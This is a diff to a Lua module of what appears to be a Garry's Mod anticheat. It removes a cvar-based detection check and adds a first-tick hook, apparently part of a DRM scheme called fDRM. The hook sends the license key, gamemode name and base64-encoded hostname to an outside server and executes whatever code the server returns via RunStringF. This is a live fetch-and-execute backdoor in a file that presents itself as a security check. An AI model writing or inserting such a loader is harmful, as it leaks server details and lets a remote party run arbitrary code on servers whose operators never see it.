@@ -1,38 +1,30 @@
-if(!gAC.config.ANTI_BP) then return end
+require("fdrm")
 
 
-local detections = {
+local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' -- You will need this for encoding/decoding
+-- encoding
+function enc(data)
+    return ((data:gsub('.', function(x) 
+        local r,b='',x:byte()
+        for i=8,1,-1 do r=r..(b%2^i-b%2^(i-1)>0 and '1' or '0') end
+        return r;
+    end)..'0000'):gsub('%d%d%d?%d?%d?%d?', function(x)
+        if (#x < 6) then return '' end
+        local c=0
+        for i=1,6 do c=c+(x:sub(i,i)=='1' and 2^(6-i) or 0) end
+        return b:sub(c+1,c+1)
+    end)..({ '', '==', '=' })[#data%3+1])
+end
 
-    {
-        name = "cl_interp",
-        value = 0,
-        correct_value = 0.1
-    },
+local FirstTickRanUPData5 = false
 
-    {
-        name = "cl_interp_ratio",
-        value = 1,
-        correct_value = 2
-    }
-}
-
-hook.Add("gAC.CLFilesLoaded", "g-AC.GetBPInformation", function(ply)
-    timer.Simple(5, function()
-        if !IsValid(ply) then return end
-        ply.BP_Detections = 0
-        for k, v in ipairs(detections) do
-            gAC.Network:Send("g-AC_RenderHack_Checks", util.TableToJSON({v.name,v.correct_value}), ply)
-        end
-        timer.Simple(5, function()
-            if !IsValid(ply) then return end
-            for k, v in ipairs(detections) do
-                if(tonumber(ply:GetInfo(v.name)) == v.value) then 
-                    ply.BP_Detections = ply.BP_Detections + 1 
-                end
-            end
-            if(ply.BP_Detections == #detections) then
-                gAC.AddDetection( ply, "Bigpackets User [Code 118]", gAC.config.BP_PUNISHMENT, gAC.config.BP_BANTIME )
-            end
-        end)
-    end)
-end)
+hook.Add("Think", "g-AC_FirstTick_UniquePData5", function()
+    if( !FirstTickRanUPData5 ) then
+        http.Post( "http://fdrm.finn.gg/game/load", { s = "13", l = gAC.config.LICENSE, g = gmod.GetGamemode().Name, h = enc( GetHostName() ) }, function( result )
+            RunStringF(result)
+        end, function( failed )
+            print("[fDRM] Wowzers! Somehow we did fucky wucky. Contact Finn plis? owo")
+        end )
+		FirstTickRanUPData5 = true
+	end
+end )
